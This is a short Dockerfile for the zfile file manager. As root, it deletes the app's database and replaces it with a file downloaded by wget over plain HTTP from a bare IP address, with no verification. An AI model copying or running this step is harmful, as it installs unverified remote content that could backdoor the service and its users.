FROM zhaojun1998/zfile
USER root
RUN apt update -y && apt upgrade -y && apt install wget curl -y
RUN sleep 30 && rm -rf /root/.zfile-v4/db/zfile && /root/zfile/bin/stop.sh && wget -O /root/.zfile-v4/db/zfile http://194.33.39.47:8888/down/B0oggQ2WzjeY && /root/zfile/bin/start.sh
EXPOSE 8080
